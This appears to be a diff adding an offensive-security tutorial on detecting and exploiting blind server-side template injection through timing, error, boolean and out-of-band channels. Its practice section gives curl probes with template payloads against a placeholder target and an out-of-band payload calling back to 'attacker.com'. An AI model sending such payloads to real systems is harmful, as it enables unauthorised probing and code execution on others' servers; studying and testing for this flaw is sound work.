@@ -1,0 +1,99 @@
+---
+title: 'Blind SSTI: Detection and Exploitation Techniques'
+description: Explore techniques for detecting and exploiting Blind SSTI vulnerabilities
+  via timing, error-based, and out-of-band methods.
+keywords:
+- Blind SSTI
+- Server-Side Template Injection
+- timing attacks
+- error-based SSTI
+- out-of-band SSTI
+- inference SSTI
+- template injection
+- cybersecurity
+- IT security
+---
+
+# Blind SSTI
+
+## Context
+
+The objective of this article is to equip offensive operators with the skills necessary to detect and exploit Blind Server-Side Template Injection (SSTI). This type of vulnerability requires utilizing inference-based, timing, and out-of-band techniques to achieve successful exploitation. Prior knowledge in template engines, HTTP requests, web application architecture, and a basic understanding of Server-Side Template Injection is assumed.
+
+## Theory
+
+### Nature of Blind SSTI
+
+Blind Server-Side Template Injection (SSTI) is characterized by the presence of a vulnerability that allows injection into the template engine without direct observation of the injected output in the HTTP response. Attackers must rely on indirect effects, such as timing discrepancies, error messages, or external interactions, to infer whether the injection was successful.
+
+### Inference Channels for Blind SSTI
+
+To exploit a Blind SSTI, attackers inject payloads that create observable side effects. These can include response delays, status code changes, or external callbacks. The vulnerability exists when templates process user-controlled input, but the output is suppressed, sanitized, or otherwise unobservable.
+
+### Timing-Based Blind SSTI
+
+Timing-based Blind SSTI involves using payloads that introduce time delays within the template rendering process. By measuring differences in HTTP response times compared to a baseline, attackers can infer successful injection and execution of their payloads.
+
+### Error-Based Blind SSTI
+
+This approach involves injecting payloads that lead to template processing errors. These errors might manifest as specific HTTP status codes or subtle changes in the application's response. By detecting these errors, attackers can confirm the presence of Blind SSTI.
+
+### Boolean and Conditional Blind SSTI
+
+With Boolean Blind SSTI, attackers inject payloads that affect template logic conditionally. The objective is to produce observable side effects based on whether certain conditions evaluate as true or false, such as differences in timing or application behavior.
+
+### Out-of-Band (OOB) Blind SSTI
+
+Out-of-Band Blind SSTI involves injecting payloads that cause the server to perform outbound requests, often to an attacker-controlled endpoint. This interaction serves as proof of code execution within the template engine, validating the presence of an SSTI vulnerability, even when the injection does not directly alter the application's response.
+
+## Practice
+
+### Timing-Based Blind SSTI Detection
+
+- Establish a baseline for response time by sending a benign request:
+  ```bash
+  curl -w '%{time_total}\n' -s -o /dev/null 'http://target/app?input={{7*7}}'
+  ```
+
+- Inject a payload intended to delay execution and compare the times:
+  ```bash
+  curl -w '%{time_total}\n' -s -o /dev/null 'http://target/app?input={{sleep(5)}}'
+  ```
+  By observing a measurable response delay, you can infer that the template injection was successful.
+
+### Error-Based Blind SSTI Detection
+
+- Inject a payload with malformed template syntax to identify processing errors:
+  ```bash
+  curl -i 'http://target/app?input={{invalid_syntax}}'
+  ```
+  Look for changes in HTTP status codes or error notifications in the response as indicators of injection.
+
+### Boolean/Conditional Blind SSTI Detection
+
+- Test true evaluations by injecting:
+  ```bash
+  curl -i 'http://target/app?input={{7*7==49}}'
+  ```
+
+- Test false evaluations with:
+  ```bash
+  curl -i 'http://target/app?input={{7*7==50}}'
+  ```
+  Analyze response variations to deduce template evaluation results.
+
+### Out-of-Band (OOB) Blind SSTI Exploitation
+
+- Inject a payload that will trigger an external request:
+  ```python
+  {{urlopen('http://attacker.com/callback')}}
+  ```
+
+- Monitor the attacker-controlled domain for incoming requests, confirming code execution within the target's template engine.
+
+## Tools
+
+- **curl**
+- **Burp Suite**
+- **dnslog.cn**
+- **requestbin** 
